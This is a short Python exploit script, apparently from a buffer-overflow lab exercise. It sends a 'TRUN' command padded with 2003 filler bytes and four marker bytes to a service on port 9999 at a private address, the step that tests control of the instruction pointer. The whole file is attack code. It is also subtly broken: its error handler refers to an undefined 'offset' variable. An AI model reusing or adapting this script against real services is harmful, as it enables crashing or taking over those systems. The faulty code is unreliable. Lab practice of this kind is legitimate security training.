#!/usr/bin/python
#### D4nk0St0rM
#### spread l0v3, share Kn0wl3dge

import sys, socket
from time import sleep

shellcode = 'A' * 2003 + 'B' * 4

try:
        payload = "TRUN /.:/" + shellcode
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.44.141",9999))
        print ("[+] Sending the payload...\n" + str(len(shellcode)))
        s.send((payload.encode()))
        s.close()
except:
        print ("The fuzzing crashed at %s bytes" % str(len(offset)))
        sys.exit()
